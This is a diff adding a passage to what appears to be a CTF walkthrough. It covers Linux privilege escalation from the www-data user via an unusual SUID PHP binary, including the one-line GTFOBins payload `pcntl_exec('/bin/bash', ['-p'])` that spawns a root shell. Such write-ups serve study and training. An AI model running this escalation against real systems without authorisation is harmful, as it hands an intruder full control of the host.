@@ -97,3 +97,9 @@ as usual, i will transfer Linpeas first for further investigations 😆
 - We can run `sudo -l` cos' sudo isn't installed on `www-data`
 - Checking for `SUID` we have an unusual binary here which is `/usr/bin/php7.3`
 
+![](https://i.imgur.com/QWEleiF.png)
+
+Great `GTFOBINS` has a payload for it to escalate to root using `PHP`, Tweaking my payload to this: `/usr/bin/php7.3 -r "pcntl_exec('/bin/bash', ['-p']);"`
+
+![](https://i.imgur.com/dfwVNWV.png)
+
